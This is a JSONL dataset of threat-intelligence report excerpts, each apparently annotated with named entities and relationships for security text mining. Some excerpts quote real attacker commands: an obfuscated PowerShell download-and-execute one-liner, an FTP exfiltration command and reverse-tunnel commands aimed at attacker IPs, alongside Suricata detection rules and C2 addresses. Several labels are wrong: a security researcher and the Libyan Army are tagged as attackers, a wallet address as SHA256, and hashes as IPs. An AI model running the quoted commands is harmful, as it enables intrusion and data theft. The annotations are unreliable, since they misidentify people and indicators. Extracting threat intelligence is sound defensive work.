{"instruction": "OpenAI Fixes Critical Account Takeover Flaw In another caching-related issue, the company also addressed a critical account takeover vulnerability that could be exploited to seize control of another user's account, view their chat history, and access billing information without their knowledge. The flaw, which was discovered by security researcher Gal Nagli, bypasses protections put in place by OpenAI on chat.openai[.]com to read a victim's sensitive data. This is achieved by first creating a specially crafted link that appends a .CSS resource to the \"chat.openai[.]com/api/auth/session/\" endpoint and tricking a victim to click on the link, causing the response containing a JSON object with the accessToken string to be cached in Cloudflare's CDN. The cached response to the CSS resource (which has the CF-Cache-Status header value set to HIT) is then abused by the attacker to harvest the target's JSON Web Token (JWT) credentials and take over the account.", "input": null, "output": "Named Entities: (Gal Nagli, attacker), (chat.openai[.]com, Domain), (Cloudflare's CDN, tool)\nRelationships: (chat.openai[.]com, cache, Cloudflare's CDN)"}
{"instruction": "The insights about ScarCruft's various attack vectors come from a GitHub repository maintained by the adversarial collective to host malicious payloads since October 2020. \"The threat actor was able to maintain a GitHub repository, frequently staging malicious payloads for more than two years without being detected or taken down,\" Zscaler researchers said. Outside of malware distribution, ScarCruft has also been observed serving credential phishing webpages targeting multiple email and cloud services such as Naver, iCloud, Kakao, Mail.ru, and 163.com. It's however not clear how these pages are accessed by the victims, raising the possibility that they may have been embedded inside iframes on websites controlled by the attacker or sent as HTML attachments via email. Also discovered by SEKOIA.IO is a piece of malware named AblyGo, a backdoor written in Go that utilizes the Ably real-time messaging framework to receive commands.", "input": null, "output": "Named Entities: (ScarCruft, attacker), (GitHub repository, tool), (credential phishing webpages, threat type), (Mail.ru, Domain), (163.com, Domain), (AblyGo, malware), (Go, tool), (Ably real-time messaging framework, tool)\nRelationships: (ScarCruft, maintain, GitHub repository), (ScarCruft, serve, credential phishing webpages), (credential phishing webpages, target, Mail.ru), (credential phishing webpages, target, 163.com), (ScarCruft, embed, credential phishing webpages), (ScarCruft, send, credential phishing webpages), (AblyGo, utilize, Ably real-time messaging framework)"}
{"instruction": "Luring new gamers Unlike other fake app routines that redirect users while infecting devices, the cybercriminals took no pretense to create a game and simply copied from existing P2Es. The Twitter account and the websites are just fronts to entice users to download MacStealer. Once the malware executes, specific pieces of information stored in the device are stolen as soon as the user inputs their respective password in the GUI prompt. Our sensors picked up on the high-risk samples for analysis during a routine check; a closer inspection revealed the website worldofcreatures[.]io connected to the sample. A quick search online showed the website being heavily promoted on Twitter.", "input": null, "output": "Named Entities: (MacStealer, malware), (worldofcreatures[.]io, Domain)\nRelationships: (MacStealer, connect to, worldofcreatures[.]io)"}
{"instruction": "This malicious CAB file contains an obfuscated VBS script that functions as the agent responsible for delivering the next payload. When a victim opens the malicious CAB file and runs the VBS file, the second stage payload is retrieved. Delivering the PowerShell Payload The second stage payload is an obfuscated VBS script file masquerading as an image file (SHA256: 6560ef1253f239a398cc5ab237271bddd35b4aa18078ad253fd7964e154a2580). When this malicious file is run, a malicious PowerShell script is retrieved. The domain delivering the malicious PowerShell script is an infected or spoofed host with documented affiliations with the Libyan Army, and a quick check on the domain gpla[.]gov[.]ly shows it was registered in 2019. Similar campaigns have suggested the creation, use, and abuse of fake social media accounts claiming to belong to reputable organizations to serve advertisements with links to public cloud sharing platforms which contain malicious payloads to unsuspecting victims. This allows the threat actors to:", "input": null, "output": "Named Entities: (agent, tool), (second stage payload, malware), (malicious PowerShell script, tool), (gpla[.]gov[.]ly, Domain), (Libyan Army, attacker)\nRelationships: (VBS script, runs, agent), (agent, delivers, second stage payload), (second stage payload, retrieves, malicious PowerShell script), (malicious PowerShell script, delivered by, gpla[.]gov[.]ly)"}
{"instruction": "alert dns $HOME_NET any -> any any (msg:\"ET TROJAN Possible PaperCut MF/NG Post Exploitation Domain in DNS Lookup (windowservicecemter .com)\"; dns_query; content:\"windowservicecemter.com\"; nocase; isdataat:!1,relative; pcre:\"/(?:^|\\.)windowservicecemter\\.com$/\"; reference:url,www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software; classtype:trojan-activity; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, deployment Perimeter, former_category MALWARE, performance_impact Low, signature_severity Major, updated_at 2023_04_21;) alert dns $HOME_NET any -> any any (msg:\"ET ATTACK_RESPONSE Possible PaperCut MF/NG Post Exploitation Domain in DNS Lookup (winserverupdates .com)\"; dns_query; content:\"winserverupdates.com\"; nocase; isdataat:!1,relative; pcre:\"/(?:^|\\.)winserverupdates\\.com$/\"; reference:url,www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software; classtype:trojan-activity; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, deployment Perimeter, former_category MALWARE, performance_impact Low, signature_severity Major, updated_at 2023_04_21;) alert dns $HOME_NET any -> any any (msg:\"ET TROJAN Possible PaperCut MF/NG Post Exploitation Domain in DNS Lookup (netviewremote .com)\"; dns_query; content:\"netviewremote.com\"; nocase; isdataat:!1,relative; pcre:\"/(?:^|\\.)netviewremote\\.com$/\"; reference:url,www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software; classtype:trojan-activity; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, deployment Perimeter, former_category MALWARE, performance_impact Low, signature_severity Major, updated_at 2023_04_21;)", "input": null, "output": "Named Entities: (windowservicecemter.com, Domain), (winserverupdates.com, Domain), (netviewremote.com, Domain)\nRelationships: No related relations."}
{"instruction": "Malware e62afe2273986240746203f9d55496db inn.exe Malware 5e6a033fa01739d9b517a468bd812162 kkk.exe Malware 4a8854363044e4d66bf34a0cd331d93d inn.exe Malware 124ad1778c65a83208dbefcec7706dc6 AcroRD32.exe Malware 17199ddac616938f383a0339f416c890 iass.dll Malicious email sender address \u201c(name of victim company official)@yahoo.com\u201d Malicious email content, including any attachments and/or message body \u201cIf not read this paper, pay attention.\u201d Malicious email hyperlinked probable malware The hyperlink indicated a \u201c.zip\u201d file and contained the words \u201cquality specifications\u201d in reference to a particular component or product unique to the victim U.S. corporation. Malicious email signature block Contained the name, title, phone number, and corporate email address of an actual victim company official. Malicious attachment name Project-seems-clear-for-takeoff.zip Possible C2 domain <xxx>.arrowservice[dot]net Where <xxx> may be the full name of the targeted company Possible C2 domain <xxx>.federalres[.]org Possible C2 domain <xxx>.businessconsults[.]net Where <xxx> may be the targeted company name abbreviation or full name Possible C2 domain idahoanad[dot]org Possible C2 domain energyreview.strangled[.]net Possible C2 domain blackcake[.]net Possible C2 domain infosupports[.]com Malware 7caf4dbf53ff1dcd5bd5be92462b2995 iTunesHelper.exe Malware", "input": null, "output": "Named Entities: (e62afe2273986240746203f9d55496db, malware), (inn.exe, file), (5e6a033fa01739d9b517a468bd812162, malware), (kkk.exe, file), (4a8854363044e4d66bf34a0cd331d93d, malware), (124ad1778c65a83208dbefcec7706dc6, malware), (AcroRD32.exe, file), (17199ddac616938f383a0339f416c890, malware), (iass.dll, file), (Project-seems-clear-for-takeoff.zip, file), (energyreview.strangled[.]net, Domain), (blackcake[.]net, Domain), (infosupports[.]com, Domain), (7caf4dbf53ff1dcd5bd5be92462b2995, malware), (iTunesHelper.exe, file)\nRelationships: (e62afe2273986240746203f9d55496db, associated with, inn.exe), (5e6a033fa01739d9b517a468bd812162, associated with, kkk.exe), (4a8854363044e4d66bf34a0cd331d93d, associated with, inn.exe), (124ad1778c65a83208dbefcec7706dc6, associated with, AcroRD32.exe), (17199ddac616938f383a0339f416c890, associated with, iass.dll), (7caf4dbf53ff1dcd5bd5be92462b2995, associated with, iTunesHelper.exe)"}
{"instruction": "SolarWinds Orion is an enterprise network management software suite that includes performance and application monitoring and network configuration management along with several different types of analyzing tools. SolarWinds Orion is used to monitor and manage on-premise and hosted infrastructures. To provide SolarWinds Orion with the necessary visibility into this diverse set of technologies, it is common for network administrators to configure SolarWinds Orion with pervasive privileges, making it a valuable target for adversary activity. The threat actor has been observed leveraging a software supply chain compromise of SolarWinds Orion products[2] (see Appendix A). The adversary added a malicious version of the binary solarwinds.orion.core.businesslayer.dll into the SolarWinds software lifecycle, which was then signed by the legitimate SolarWinds code signing certificate. This binary, once installed, calls out to a victim-specific avsvmcloud[.]com domain using a protocol designed to mimic legitimate SolarWinds protocol traffic.", "input": null, "output": "Named Entities: (SolarWinds Orion, tool), (SolarWinds Orion products, tool), (solarwinds.orion.core.businesslayer.dll, file), (SolarWinds code signing certificate, tool), (avsvmcloud[.]com, Domain)\nRelationships: (tool, used by, SolarWinds Orion), (solarwinds.orion.core.businesslayer.dll, signed by, SolarWinds code signing certificate)"}
{"instruction": "It appears that some victims of the herbertm[.]shop scam site ordered large pallets as well as individual items. And it also appears from the complaints that some victims were offered a bait and switch. For example, some that had ordered a specific item only had a cheap unrelated item sent to them. And for the pallet scams, one victim stated they only received a video game controller instead of the pallet, and another claimed to have ordered two pallets for $89.98 but did not receive anything.", "input": null, "output": "Named Entities: (herbertm[.]shop, Domain)\nRelationships: No related relations."}
{"instruction": "Even more strange, zipsearch[.]xyz and search[.]onlinegamezone[.]club\u2014two searches we made\u2014were nowhere to be seen in Chromnius\u2019 browsing history. However, we were able to find the URLs, as they were present in autocomplete. While we do not know why the Chromnius developers designed the search function that way, it could be possible that Chromnius is paid for affiliate redirection. Conclusion Cyber Grinches actively try to take advantage of eager shoppers every year during the holiday season using new scams and techniques. However, attackers still regularly find new victims using older and more familiar methods. Below are some Dos and Don\u2019ts to stay safe from e-commerce scams. While these best practices should be used at any time, it is especially vital to remain vigilant during the online shopping season when it is easy to let down our guard.:", "input": null, "output": "Named Entities: (zipsearch[.]xyz, Domain), (search[.]onlinegamezone[.]club, Domain), (Chromnius, malware)\nRelationships: (zipsearch[.]xyz, seen in, Chromnius), (search[.]onlinegamezone[.]club, seen in, Chromnius)"}
{"instruction": "From the PowerShell script file \u201cinit.ps1\u201d, it includes a few links to cloudflare-ipfs[.]com for further attack and each file has its own backup link to crustwebsites[.]net. There are 7 files for initialization: phpupdate.exe: Xmrig Monero mining software config.json: Configuration file for mining pools networkmanager.exe: Executable used to scan and spread infection phpguard.exe: Executable used for guardian Xmrig miner to keep running init.ps1: Script file itself to sustain persistance via creating scheduled task clean.bat: Script file to remove other cryptominers on the compromised host encrypt.exe: RAR1 ransomware", "input": null, "output": "Named Entities: (init.ps1, file), (cloudflare-ipfs[.]com, Domain), (crustwebsites[.]net, Domain), (phpupdate.exe, file), (config.json, file), (networkmanager.exe, file), (phpguard.exe, file), (init.ps1, file), (clean.bat, file), (encrypt.exe, file), (RAR1 ransomware, threat type)\nRelationships: (PowerShell script file, include, cloudflare-ipfs[.]com), (PowerShell script file, include, crustwebsites[.]net), (init.ps1, include, cloudflare-ipfs[.]com), (init.ps1, include, crustwebsites[.]net)"}
{"instruction": "After departing the sender\u2019s local infrastructure, the message eventually routes through \u201cacalpulps[.]com\u201d before being delivered to the final recipient. This domain was only registered in August 2021, making the domain somewhat suspicious. Additionally, the domain used in the \u201cReply-To\u201d address, \u201cftqplc[.]in\u201d, was also recently registered (October 2021), making it also highly suspect. The email body encourages the recipient to open attachments about a scheduled shipment. As of the publish date of this blog, the domain \u201cv[.]al\u201d included in the body of the letter does not resolve. Attached directly to the sample email are a PNG image and two Zip archives. \u201cmaersk.png\u201d is just an image file, as shown in Figure 4. The two Zip archives, \u201cSHIPMENT_DOCUMENTS_INV-PLIST01256_BL PDF[.]zip\u201d and \u201cSHIPMENT_DOCUMENTS_INV-PLIST01256_BL PDF (2)[.]zip\u201d, however, contain an embedded copy of STRRAT. Examining the STRRAT attachment", "input": null, "output": "Named Entities: (acalpulps[.]com, Domain), (ftqplc[.]in, Domain), (v[.]al, Domain), (maersk.png, file), (SHIPMENT_DOCUMENTS_INV-PLIST01256_BL PDF[.]zip, file), (STRRAT, malware)\nRelationships: No related ralations."}
{"instruction": "The malware also decrypts strings with base64 and xor key \"Margented.\" The decrypted strings are \"freelancer.com\" and 207[.]32.217.89. It then accesses a Command and Control (C2) server (207[.]32[.]217[.]89:14588). It uses a unique header ,\"Authorization: ns1=d8cc092a9e22f3fc55d63aad32150529\" to verify itself, and the decrypted ID \u201cfreelancer.com\u201d to prevent connections from other malware or researchers.", "input": null, "output": "Named Entities: (malware, malware), (freelancer.com, Domain), (207[.]32.217.89, IP), (Command and Control server, tool)\nRelationships: (malware, accesses, Command and Control server), (Command and Control server, IP, 207[.]32.217.89)"}
{"instruction": "The main page www.madafak[DOT]in attempts to pass itself off as Google Analytics but it secretly loads a coinminer library (ga.js) in the background. Figure 7. Website claims to be related to Google Analytics but secretly loads coin-mining library From the script shown in Figure 7 we can see that the coinminer mines Monero, throttles CPU usage at 0.5 (50 percent), and contains a hardcoded Monero wallet address (5bdd3443937ebe08d3e3c99e9524afc13702eba28340). Coin-mining script: Mp3 Songs Download The extension Mp3 Songs Download doesn\u2019t start its coin-mining script until the user clicks on the extension button and is redirected to a website. As the JavaScript in Figure 8 shows, the extension redirects the user to http://mp3song-s[DOT]com. Figure 8. Mp3 Songs Download extension source code redirects users to another website", "input": null, "output": "Named Entities: (www.madafak[DOT]in, Domain), (Google Analytics, tool), (ga.js, file), (5bdd3443937ebe08d3e3c99e9524afc13702eba28340, SHA256), (Mp3 Songs Download, tool), (http://mp3song-s[DOT]com, URL)\nRelationships: (www.madafak[DOT]in, pass itself off as, Google Analytics), (www.madafak[DOT]in, load, ga.js), (ga.js, contain, 5bdd3443937ebe08d3e3c99e9524afc13702eba28340), (Mp3 Songs Download, redirect, http://mp3song-s[DOT]com)"}
{"instruction": "Mining script These apps\u2019 domains are hardcoded in their app manifest file, as shown in Figure 2. Figure 2. \"Fast-search.tk\"\u2014the domain for the Fast-search Lite app\u2014is hardcoded in the apps' manifest file When each app is launched, the domain is silently visited in the background and triggers GTM with the key GTM-PRFLJPX, which is shared across all eight applications. GTM is a legitimate tool that allows developers to inject JavaScript dynamically into their applications. However, GTM can be abused to conceal malicious or risky behaviors, since the link to the JavaScript stored in GTM is https://www.googletagmanager.com/gtm.js?id={GTM ID} which doesn\u2019t indicate the function of the code invoked. Figure 3. The GTM script, which the apps access to activate the mining script By monitoring the network traffic from these apps, we found that they all connect to the following remote location, which is a coin-mining JavaScript library: http://statdynamic.com/lib/crypta.js", "input": null, "output": "Named Entities: (Mining script, malware), (Fast-search.tk, Domain), (GTM-PRFLJPX, tool), (http://statdynamic.com/lib/crypta.js, URL)\nRelationships: (Mining script, domain, Fast-search.tk), (Fast-search.tk, seen in, Mining script), (Mining script, trigger, GTM-PRFLJPX), (Mining script, connect to, http://statdynamic.com/lib/crypta.js)"}
{"instruction": "However, using some simple tools allows us to see what\u2019s responsible for maxing out the CPU. Using Windows Task Manager we can confirm the CPU load on the computer and, with some additional system analysis tools, we can see a number of network connections being made to coinhive.com, which confirms the presence of a miner using Coinhive scripts. Figure 4. Signs that can confirm the presence of cryptocurrency mining activity on a computer We can also capture WebSocket traffic using network analysis tools and see the traffic sent between the miner and the server, which may include calculated hashes sent to the mining pool while the mining code is running. Figure 5. Captured network traffic showing communications between mining script and mining pool server", "input": null, "output": "Named Entities: (Windows Task Manager, tool), (coinhive.com, Domain), (mining script, tool), (mining pool server, tool)\nRelationships: (mining script, sent to, mining pool server)"}
{"instruction": "Similarly, Symantec also observed legitimate tools (openssl.exe) and a downloader tool (ssleay32.dll) present in the same directories used to download additional tools: CSIDL_SYSTEM\\rundll32.exe CSIDL_COMMON_APPDATA\\georgettaemilee\\ssleay32.dll ,DllRegisterServer http://107.173.141.103:443/downloadc.php?key=[REDACTED] CSIDL_SYSTEM\\rundll32.exe CSIDL_COMMON_APPDATA\\samariaantonina\\ssleay32.dll ,DllRegisterServer http://107.173.141.114:443/downloadc.php?key=[REDACTED] Similar download requests were also observed via PowerShell: powershell -exec bypass $V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$AaA = \"Do\";$AaB = \" wnloadStr\";$AaC = \"ing\";$s=\"$AaA$AaB$AaC\"('http://23.95.220.166:80/download.php?k=564');$s;\" $V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;start-sleep 10;$s=$V.DownloadString('http://104.168.44.16:443/H6qy8yvXhV69mF8CgpmWwKb1oV19xMqaI');iex($s) During PowGoop activity, Symantec also observed the attackers using the Secure Sockets Funneling tool as well as Chisel suggesting a link between the two sets of activity. \"CSIDL_PROFILE\\[REDACTED]\\documents\\ussf.exe\" -c CSIDL_PROFILE\\[REDACTED]\\documents\\config.txt -F 9900 -p [REDACTED] 107.172.97.172 CSIDL_COMMON_APPDATA\\sharp.cmd client 107.175.0.140:443 R:8888:127.0.0.1:9999 CSIDL_COMMON_APPDATA\\sharp.cmd server -p [REDACTED] --socks5", "input": null, "output": "Named Entities: (openssl.exe, file), (ssleay32.dll, file), (CSIDL_SYSTEM\\rundll32.exe, file), (CSIDL_COMMON_APPDATA\\georgettaemilee\\ssleay32.dll, file), (CSIDL_COMMON_APPDATA\\samariaantonina\\ssleay32.dll, file), (http://107.173.141.103:443/downloadc.php?key=[REDACTED], URL), (http://107.173.141.114:443/downloadc.php?key=[REDACTED], URL), (PowerShell, tool), (http://23.95.220.166:80/download.php?k=564, URL), (http://104.168.44.16:443/H6qy8yvXhV69mF8CgpmWwKb1oV19xMqaI, URL), (PowGoop, malware), (Secure Sockets Funneling, tool), (Chisel, tool), (CSIDL_PROFILE\\[REDACTED]\\documents\\ussf.exe, file), (CSIDL_PROFILE\\[REDACTED]\\documents\\config.txt, file), (107.172.97.172, IP), (107.175.0.140:443, IP), (CSIDL_COMMON_APPDATA\\sharp.cmd, file)\nRelationships: No related relations."}
{"instruction": "Other machines on the same network \nWe saw suspicious activity on various machines on this same victim\u2019s network. The attackers targeted several other users within the organization with the same file, proposal_pakistan110.chm:error.html, which was opened by an archiver tool and, in one instance, via the Microsoft Edge browser. Following this, we observed a backdoor being executed on the machine, alongside additional tools downloaded to the %APPDATA% directory from the attacker\u2019s infrastructure. \nHash Directory Tool \n450ebd66ba67bb46bf18d122823ff07ef4a7b11afe63b6f269aec9236a1790cd CSIDL_COMMON_APPDATA\\oracle local.exe \nee32bde60d1175709fde6869daf9c63cd3227155e37f06d45a27a2f45818a3dc CSIDL_COMMON_APPDATA\\adobe adobe.exe \n071e20a982ea6b8f9d482685010be7aaf036401ea45e2977aca867cedcdb0217 c:\\programdata\\oracle java.ee", "input": null, "output": "Named Entities: (proposal_pakistan110.chm:error.html, file), (archiver tool, tool), (Microsoft Edge browser, tool), (backdoor, malware), (450ebd66ba67bb46bf18d122823ff07ef4a7b11afe63b6f269aec9236a1790cd, SHA256), (ee32bde60d1175709fde6869daf9c63cd3227155e37f06d45a27a2f45818a3dc, SHA256), (071e20a982ea6b8f9d482685010be7aaf036401ea45e2977aca867cedcdb0217, SHA256)\nRelationships: (proposal_pakistan110.chm:error.html, opened by, archiver tool), (proposal_pakistan110.chm:error.html, opened by, Microsoft Edge browser), (archiver tool, executed, backdoor), (attacker's infrastructure, IP, 450ebd66ba67bb46bf18d122823ff07ef4a7b11afe63b6f269aec9236a1790cd), (attacker's infrastructure, IP, ee32bde60d1175709fde6869daf9c63cd3227155e37f06d45a27a2f45818a3dc), (attacker's infrastructure, IP, 071e20a982ea6b8f9d482685010be7aaf036401ea45e2977aca867cedcdb0217)"}
{"instruction": "At this point, the attackers ceased activity while maintaining access to the network until February 21. At 06:38, the attackers were observed downloading a custom .NET FTP tool to the infected computer. 192.119.15.36 880 hxxp://192.119.15[DOT]36:880/ftp.exe Later at 6:56, the attackers exfiltrated data using this FTP tool to a remote host: JsuObf.exe Nup#Tntcommand -s CSIDL_PROFILE\\appdata\\roaming\\adobe\\rar -a ftp://89.34.237.118:2020 -f /[REDACTED] -u [REDACTED] -p [REDACTED] Activity ceased until the attackers returned on March 5 and were observed using Quasar RAT to download a second custom AutoIt FTP exfiltration tool known as FastUploader from hxxp://192.119.15[DOT]36:880/ftp.exe. This tool was then installed to csidl_profile\\appdata\\roaming\\adobe\\ftp.exe. FastUploader is a custom FTP tool designed to exfiltrate data at a faster rate than traditional FTP clients.", "input": null, "output": "Named Entities: (custom .NET FTP tool, tool), (192.119.15.36, IP), (hxxp://192.119.15[DOT]36:880/ftp.exe, URL), (JsuObf.exe, file), (89.34.237.118:2020, IP), (Quasar RAT, tool), (AutoIt FTP exfiltration tool, tool), (FastUploader, tool), (hxxp://192.119.15[DOT]36:880/ftp.exe, URL), (csidl_profile\\appdata\\roaming\\adobe\\ftp.exe, file)\nRelationships: (JsuObf.exe, exfiltrate data to, 89.34.237.118:2020), (Quasar RAT, download, FastUploader), (FastUploader, install to, csidl_profile\\appdata\\roaming\\adobe\\ftp.exe)"}
{"instruction": "Peering into the JAR Once executed, the JAR files drop a payload JAR file with a random name and extension. The payload JAR is dropped in a randomly named directory and executed. The threat then runs VBS scripts in order to fingerprint the compromised computer. It also uses the Windows Management Instrumentation (WMI) interface to get details of any installed firewall or security products. The threat then sets registry entries to disable System Restore and set Image File Execution Options for many security products and reversing tools to svchost.exe so that the tools cannot start. It also starts ending processes related to monitoring tools. The threat also connects to its command and control (C&C) server (we observed Adwind connecting with 174[.]127[.]99[.]211 but similar IP address ranges have also been used).", "input": null, "output": "Named Entities: (svchost.exe, file), (command and control (C&C) server, tool), (Adwind, malware), (174[.]127[.]99[.]211, IP)\nRelationships: (command and control (C&C) server, observed connecting with, 174[.]127[.]99[.]211)"}
{"instruction": "Once executed, it sends an HTTP GET request to its Command and Control (C2) server at 79.137.206[.]228 to check in and retrieve the stealer configuration (Figure 6). Note the absence of User-Agent and other typical HTTP headers in this GET request. The semicolon delimited configuration can be interpreted as follows: The first comma-delimited block contains single-digit flags, denoted by 1 (enable) or 0 (disable), to toggle specific stealer features. Based on this configuration, this stealer will collect passwords stored locally (e.g., FTP, SSH), browser cookies and history, Telegram data, and screenshots. Cryptocurrency wallet collection is not enabled. A 32-character hexadecimal string (redacted in Figure 6) is a token generated by the C2 server for use in the subsequent data exfiltration request.", "input": null, "output": "Named Entities: (Command and Control (C2) server, tool), (79.137.206[.]228, IP), (cryptocurrency wallet collection, threat type)\nRelationships: (Command and Control (C2) server, IP, 79.137.206[.]228)"}
{"instruction": "To persist in the victim system, it then adds several scheduled tasks to execute the watchdog dllhost.exe every hour. It does this by executing the following command: The scheduled task names impersonate legitimate Windows-related software to deter casual detection and are as follows: SecurityHealthSystray WindowsDefender WmiPrvSE AntiMalwareServiceExecutable Dllhost MicrosoftEdgeUpd OneDriveService NvStray ActivationRule It also changes the power settings of the system to prevent it from hibernating and sleeping by executing the following command to ensure that its Monero cryptominer component (executed later) is always running while the machine is powered up: The host file is also modified to resolve security product-related domains to the IP 0.0.0.0 to disable communication by security products, e.g., for downloading updates. Lastly, it executes the watchdog component %ProgramData%\\dllhost.exe, which executes the actual cryptominer. Dllhost.exe - Miner watchdog", "input": null, "output": "Named Entities: (watchdog dllhost.exe, file), (Monero cryptominer, tool), (0.0.0.0, IP), (%ProgramData%\\dllhost.exe, file)\nRelationships: No related relations."}
{"instruction": "Moobot includes the following process names of known bots and uses the command \u201ckill -9\u201d to ensure it\u2019s the only one running in the infected device: dvrHelper, Ni**eR69xd, 1337SoraLOADER, Ni**eRd0nks1337, X19I239124UIU, IuYgujeIqn, 14Fa, ccAD, BOGOMIPS, /etc/rc.d/rc.local, g1abc4dmo35hnp2lie0kjf, /dev/FTWDT101_watchdog, /dev/netslink/, PRIVMSG, GETLOCALIP, KILLATTK, Eats8, v[0v, 93OfjHZ2z, GhostWuzHere666, WsGA4@F6F, ACDB, AbAd, iaGv Technical Analysis \u2013 ShellBot ShellBot\u2019s activity began in January and primarily targeted Cacti vulnerability. We collected three ShellBot variants in our traffic capture system. The first is \u201cPowerBots (C) GohacK\u201d from http[:]//80[.]68[.]196[.]6/ff, and the configuration is shown in Figure 9. Its C2 is \u201c49[.]212[.]234[.]206:3303\u201d, and the bot\u2019s process masquerades as \u201c/usr/sbin/sshd\u201d to evade detection. After the communication channel setup, the client waits for a command from the server. There are six commands, shown below:", "input": null, "output": "Named Entities: (Moobot, malware), (ShellBot, malware), (PowerBots (C) GohacK, tool), (http[:]//80[.]68[.]196[.]6/ff, URL), (49[.]212[.]234[.]206:3303, IP)\nRelationships: (PowerBots (C) GohacK, C2, 49[.]212[.]234[.]206:3303)"}
{"instruction": "The commands used in perlbot are listed below. It includes numerous types of flooding attacks and hacking functions. It also includes an exploit enhancement module that gets news from a public website offering exploits and security advisories.\nThe third variant is \u201cB0tchZ 0.2a\u201d from 46[.]101[.]183[.]162/.xx/web. The malicious website is shown in Figure 12. All files on this website are IRC botnets that use the same C2 server, 198[.]98[.]61[.]106:8080. The configuration from the payload that targets vulnerable Cacti servers is shown in Figure 13.", "input": null, "output": "Named Entities: (perlbot, malware), (B0tchZ 0.2a, malware), (46[.]101[.]183[.]162, IP), (198[.]98[.]61[.]106:8080, IP)\nRelationships: (perlbot, use, flooding attacks), (B0tchZ 0.2a, variant of, perlbot), (46[.]101[.]183[.]162, seen in, B0tchZ 0.2a), (198[.]98[.]61[.]106:8080, C2 server of, B0tchZ 0.2a)"}
{"instruction": "AsyncRAT is written in C# language and runs in a .Net Framework environment. Since it is fileless in this phishing campaign, I needed to dump it from the notepad.exe process for deep analysis. Once AsyncRAT starts, it decrypts a group of setting values in its Main() function, as shown in Figure 5.1. The setting values for the captured AsyncRAT indicate: A crypto key was used to decrypt the following setting values: The C2 server host and ports 95.216.102.32:6606, 7707, and 8808 The AsyncRAT version is \u201c0.5.7B\u201d \u201cIf maintain persistence\u201d is set to \u201cfalse\u201d The Mutex object name is \"AsyncMutex_6SI8OkPnk\" \u201cIf support Pastbin\u201d is set to \u201cnull\u201d \u201cIf perform anti-analysis detection\u201d is set to \u201cfalse\u201d \u201cIf make the process critical\u201d is set to \u201cfalse\u201d The Group name is set to \u201cDefault\u201d An HWID is generated using the victim\u2019s hardware information", "input": null, "output": "Named Entities: (AsyncRAT, malware), (notepad.exe, file), (95.216.102.32:6606, IP), (95.216.102.32:7707, IP), (95.216.102.32:8808, IP)\nRelationships: (AsyncRAT, dumped from, notepad.exe), (AsyncRAT, communicates with, 95.216.102.32:6606), (AsyncRAT, communicates with, 95.216.102.32:7707), (AsyncRAT, communicates with, 95.216.102.32:8808)"}
{"instruction": "Initial access Based on our observations over the past two months, these attacks originate from 163[.]123[.]142[.]210 and 185[.]17[.]0[.]19. The attackers have targeted an HTTP URI, \u201cwls-wsat/CoordinatorPortType,\u201d which belongs to an Oracle Weblogic server. The corresponding traffic capture is shown in Figure 2. The attack attempts to download a PowerShell named \u201cbypass.ps1\u201d. The partial PowerShell script, \u201cbypass.ps1,\u201d shown in Figure 3, has had its main code and strings encoded to make it harder to be detected by AntiVirus solutions. After three rounds of adding constants, reversing, and Based64 decoding, we finally uncovered clear text. The first variable, \u201c$c\u201d, contains ScrubCrypt. The detail of this variable will be discussed in the next section. The rest of the variables, from \u201c$d\u201d to \u201c$f\u201d, are for AMSI and ETW evasion, which is executed by \u201ciex\u201d at the end of the attack.", "input": null, "output": "Named Entities: (163[.]123[.]142[.]210, IP), (185[.]17[.]0[.]19, IP)\nRelationships: (163[.]123[.]142[.]210, originate from, attack), (185[.]17[.]0[.]19, originate from, attack)"}
{"instruction": "\nTechnical analysis \u2013 final payload\nWe collected several ScrubCrypt samples in February, and each payload is a little different. On 2/14, ScrubCrypt loads \u201cminer\u201d and invokes the process \u201cexplorer.exe\u201d to start the miner process to server 45[.]142[.]122[.]11:8080, shown in Figures 14 and 15. This IP address and wallet were used for the 8220 Gang attack in January 2023.", "input": null, "output": "Named Entities: (ScrubCrypt, malware), (miner, tool), (explorer.exe, file), (45[.]142[.]122[.]11:8080, IP)\nRelationships: (ScrubCrypt, load, miner), (ScrubCrypt, invoke, explorer.exe)"}
{"instruction": "On 2/16, ScrubCrypt loaded a module also named \u201cbat\u2019, as shown in Figure 20, but the data for its unzip is from its \u201cResources\u201d section. It communicates with the same C2 server, and downloads two files from 163[.]123[.]142[.]210. These files are also compressed PE files named \u201cplugin_3.dll\u201d and \u201cplugin_4.dll\u201d. They are identical to the files from 2/15 and start crypto miner activity using the same configuration, as shown in Figure 21.", "input": null, "output": "Named Entities: (ScrubCrypt, malware), (C2 server, tool), (163[.]123[.]142[.]210, IP), (plugin_3.dll, file), (plugin_4.dll, file)\nRelationships: (ScrubCrypt, communicate with, C2 server), (ScrubCrypt, download, plugin_3.dll), (ScrubCrypt, download, plugin_4.dll), (plugin_3.dll, identical to, plugin_4.dll)"}
{"instruction": "Up through October 2022, one of the C2 servers (176[.]65[.]137[.]5) listed in our Zerobot report historically distributed the Mirai-based SORA variant. It then switched to distributing Zerobot the month after. For example, hxxp://176[.]65[.]137[.]5/bins/zero[.]x86 served a UPX-packed SORA binary in October 2022 (Figure 10), but similar URLs with the zero.{arch} filename were later seen distributing Zerobot instead. The switch from distributing SORA to Zerobot, but using the same campaign filename is interesting as these families do not share a common C2 protocol. The intent behind the switch remains unclear. Apart from Zerobot, we are also highlighting several additional Golang botnets caught by our honeypots.", "input": null, "output": "Named Entities: (C2 servers, tool), (176[.]65[.]137[.]5, IP), (Mirai-based SORA variant, malware), (Zerobot, malware), (hxxp://176[.]65[.]137[.]5/bins/zero[.]x86, URL), (Golang botnets, malware)\nRelationships: (C2 servers, distribute, Mirai-based SORA variant), (C2 servers, distribute, Zerobot), (176[.]65[.]137[.]5, C2 server, Mirai-based SORA variant), (176[.]65[.]137[.]5, C2 server, Zerobot), (hxxp://176[.]65[.]137[.]5/bins/zero[.]x86, distribute, Zerobot), (Zerobot, family, Golang botnets)"}
